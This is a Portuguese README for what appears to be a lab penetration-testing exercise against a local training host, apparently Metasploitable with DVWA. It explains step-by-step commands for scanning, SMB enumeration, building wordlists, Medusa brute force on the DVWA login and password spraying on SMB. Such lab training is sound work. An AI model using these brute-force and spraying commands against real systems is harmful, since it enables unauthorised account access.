# desafio-medusa

# Fase de Reconhecimento e Conectividade

Teste de Conectividade (Ping):
```ping -c 3 192.168.56.101```

Explicação: Verifica se a máquina-alvo está ligada e acessível na rede local enviando 3 pacotes ICMP.

Scan de Portas e Versões (Nmap):
```nmap -sV -p 21,22,80,445,139 192.168.56.101```

Explicação: Detecta quais os serviços e versões que estão em execução nas portas principais do alvo (FTP, SSH, HTTP, SMB).

Conexão ao Serviço FTP:
```ftp 192.168.56.101```

Explicação: Estabelece ligação direta ao serviço FTP do alvo para testar acessos ou banners.

# Enumeração de Serviços (SMB e Linux)

Comando:
```enum4linux -a 192.168.56.101 | tee enum4_output.txt```

Explicação: Faz uma enumeração abrangente (-a) do sistema SMB/Linux no alvo (192.168.56.101) e guarda a saída simultaneamente no terminal e num arquivo de texto.

# Criação de Wordlists Personalizadas

Comando para usuários SMB:
```echo -e "user\nmsfadmin\nservice" > smb_users.txt```

Explicação: Cria um arquivo de texto smb_users.txt com os nomes de usuário para o teste.

Comando para senhas:
```echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt```

Explicação: Cria o arquivo senhas_spray.txt com uma lista de senhas comuns para os testes.

# Ataques de Força Bruta e Password Spraying com Medusa

Força Bruta no Painel Web (DVWA):
```medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http``` 
```-m PAGE:'/dvwa/login.php'``` 
```-m FORM:'username="USER"&password="PASS"&Login=Login' ```
```-m 'FAIL=Login failed' -t 6```

Explicação: Testa credenciais em massa contra o formulário de login web do DVWA no IP alvo.

Password Spraying em SMB:
```medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2```

Explicação: Executa testes de password spraying cruzando os usuários e as senhas criadas no serviço SMB.

# Validação de Acessos SMB

Comando:
```smbclient -L //192.168.56.101 -U msfadmin```

Explicação: Lista os compartilhamentos de rede disponíveis no alvo, autenticando-se com o usuário msfadmin.
